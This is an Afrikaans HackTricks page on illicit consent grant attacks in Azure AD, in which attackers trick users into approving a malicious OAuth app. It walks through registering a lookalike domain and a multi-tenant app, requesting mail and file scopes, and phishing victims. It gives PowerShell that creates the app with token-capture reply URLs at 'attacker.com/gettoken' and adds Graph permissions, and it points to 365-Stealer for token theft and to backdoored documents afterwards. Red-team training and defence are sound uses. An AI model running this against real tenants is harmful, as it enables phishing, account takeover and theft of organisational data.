# Az - Onwettige Toestemming Verlening

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## OAuth-toepassing Hengelary

**Azure-toepassings** vra vir toestemming om die **gebruikersdata** te benader (basiese inligting, maar ook toegang tot dokumente, stuur e-posse...).\
Indien **toegelaat**, kan 'n normale gebruiker slegs toestemming verleen vir **"Lae Impak" toestemmings**. In **alle ander** gevalle is **administratiewe toestemming vereis**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` en 'n aangepaste rol wat `toestemming verleen om toepassings toestemming te gee` kan huurderbre√´ toestemming gee.

Slegs toestemmings wat **nie administratiewe toestemming benodig nie** word geklassifiseer as **lae impak**. Dit is toestemmings wat vereis word vir **basiese aanmelding soos openid, profiel, e-pos, User.Read en offline\_access**. Indien 'n **organisasie** **gebruikerstoestemming toelaat vir alle toepassings**, kan 'n werknemer toestemming verleen vir 'n toepassing om **bogenoemde van hul profiel te lees**.

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

Daarom kan 'n aanvaller 'n **skadelike Toepassing** voorberei en met 'n **hengelary**, die gebruiker die Toepassing laat **aanvaar en sy data steel**.

### 2 Tipes Onwettige Toestemming Verleningsaanvalle

* **Ongeverifieerd**: Skep vanaf 'n eksterne rekening 'n toepassing met die toestemmings `User.Read` en `User.ReadBasic.All` byvoorbeeld, hengel 'n gebruiker, en jy sal in staat wees om gidsinligting te benader.
* Dit vereis dat die gehengelde gebruiker in staat moet wees om OAuth-toepassings vanaf eksterne omgewings te aanvaar!
* **Geverifieer**: Nadat 'n hoof met genoeg voorregte gekompromitteer is, skep 'n toepassing binne die rekening en hengel 'n paar bevoorregte gebruiker wat bevoorregte OAuth-toestemmings kan aanvaar.
* In hierdie geval kan jy reeds die inligting van die gids benader, dus is die toestemming `User.ReadBasic.All` nie meer interessant nie.
* Jy is waarskynlik belangstel in **toestemmings wat vereis dat 'n administrateur hulle toeken**, omdat 'n rou gebruiker geen OAuth-toepassings enige toestemming kan gee nie, daarom moet jy slegs daardie gebruikers **hengel** (meer oor watter rolle/toestemmings hierdie voorreg verleen later)

### Kontroleer of gebruikers toestemming kan verleen

Die volgende PowerShell-opdrag word gebruik om die toestemmingskonfigurasie vir gebruikers in Azure Active Directory (Azure AD) te kontroleer met betrekking tot hul vermo√´ om toestemming te verleen vir toepassings:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Deaktiveer gebruikerstoestemming**: Hierdie instelling verbied gebruikers om toestemming aan aansoeke te verleen. Geen gebruikerstoestemming vir aansoeke word toegelaat nie.
* **Gebruikers kan toestemming verleen vir programme van geverifieerde uitgewers of jou organisasie, maar slegs vir toestemmings wat jy kies**: Hierdie instelling maak dit vir alle gebruikers moontlik om slegs toestemming te verleen vir aansoeke wat deur 'n geverifieerde uitgewer gepubliseer is en aansoeke wat in jou eie huurder geregistreer is. Dit voeg 'n beheerlaag by deur slegs toestemming vir spesifieke toestemmings toe te laat.
* **Gebruikers kan toestemming verleen vir alle aansoeke**: Hierdie instelling is meer inskiklik en laat alle gebruikers toe om toestemming te verleen vir enige toestemmings vir aansoeke, solank daardie toestemmings nie administratiewe toestemming vereis nie.
* **Aangepaste aansoektoestemmingsbeleid**: Hierdie instelling dui aan dat 'n aangepaste beleid van krag is, wat op spesifieke organisatoriese vereistes toegespits kan word en 'n kombinasie van beperkings gebaseer op die aansoekuitgewer, die toestemmings wat die aansoek versoek, en ander faktore mag behels.

## **Begrip van Illegitieme Toestemmingverleningsaanval**

In 'n illegitieme toestemmingverleningsaanval, mislei aanvallers eindgebruikers om toestemming te verleen aan 'n kwaadwillige aansoek wat by Azure geregistreer is. Dit word gedoen deur die aansoek te laat voorkom as legitiem, wat slagoffers onbewus lei om op 'n "Aanvaar" knoppie te klik. As gevolg hiervan reik Azure AD 'n token uit na die aanvaller se webwerf, wat hulle in staat stel om toegang te verkry en die slagoffer se data te manipuleer, soos die lees of stuur van e-posse en die toegang tot l√™ers, sonder 'n organisatoriese rekening nodig te h√™.

## **Aanvalsproses-oorsig**

Die aanval behels verskeie stappe wat 'n generiese maatskappy teiken. So kan dit ontvou:

1. **Domeinregistrasie en Aansoekhuisvesing**: Die aanvaller registreer 'n domein wat lyk soos 'n betroubare webwerf, byvoorbeeld "veiligedomeinlogin.com". Onder hierdie domein word 'n subdomein geskep (bv. "maatskappyname.veiligedomeinlogin.com") om 'n aansoek te huisves wat ontwerp is om magtigingskodes vas te vang en toegangstokens aan te vra.
2. **Aansoekregistrasie in Azure AD**: Die aanvaller registreer dan 'n Meertenant Aansoek in hul Azure AD Huurder, wat dit na die teikenmaatskappy noem om as legitiem te verskyn. Hulle konfigureer die aansoek se Omleidings-URL om te verwys na die subdomein wat die kwaadwillige aansoek huisves.
3. **Opstel van Toestemmings**: Die aanvaller stel die aansoek op met verskeie API-toestemmings (bv. `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Hierdie toestemmings, eens verleen deur die gebruiker, laat die aanvaller toe om sensitiewe inligting namens die gebruiker te onttrek.
4. **Verspreiding van Kwaadwillige Skakels**: Die aanvaller stel 'n skakel saam wat die kli√´nt-ID van die kwaadwillige aansoek bevat en deel dit met geteikende gebruikers, deur hulle te mislei om toestemming te verleen.

## **Gebruik van Gereedskap vir die Aanval**

Die aanval kan gefasiliteer word met gereedskap soos [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Voor-Aanvalsvoorbereiding:

As die aanvaller 'n sekere vlak van toegang tot 'n gebruiker in die slagoffer-organisasie het, kan hulle nagaan of die organisasie se beleid die gebruiker toelaat om aansoeke te aanvaar:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Vir die uitvoering van die aanval, sal die aanvaller 'n **nuwe App in hul Azure Huurder** moet skep (in App-registrasies), wat gekonfigureer is met die toestemmings:

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` is binne `Microsoft Graph` in `Delegated permissions`. (Aansoektoestemmings sal altyd ekstra goedkeuring benodig).

* `User.ReadBasic.All` is die toestemming wat jou sal toelaat om **inligting van al die gebruikers** in die organisasie te **lees** indien dit toegestaan word.
* Onthou dat slegs `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` en 'n aangepaste rol wat `toestemming het om toestemmings aan aansoeke te verleen` kan huurderbre√´ toestemming gee. So, jy moet **'n gebruiker met een van daardie rolle** visvang as jy wil h√™ hy moet 'n **App wat admin-toestemming benodig** goedkeur.

Jy kan ook 'n App skep via die opdraggelyn met:

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Kyk na [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) om te leer hoe om dit te konfigureer.

{% hint style="warning" %}
Let daarop dat die verkrygde **toegangsteken** vir die **grafiek-eindpunt** sal wees met die omvang: `User.Read` en `User.ReadBasic.All` (die versoekte toestemmings). Jy sal nie ander aksies kan uitvoer nie (maar dit is genoeg om **inligting oor al die gebruikers** in die organisasie af te laai).
{% endhint %}

## [O365-Aanval-Gereedskapskas](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Jy kan ook hierdie gereedskap gebruik om hierdie aanval uit te voer.

## Post-Exploitation

Sodra jy toegang tot die gebruiker het, kan jy dinge doen soos die steel van sensitiewe dokumente en selfs die oplaai van agterdeur-dokumentl√™ers.

## Verwysings

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**SUBSKRIPSIEPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
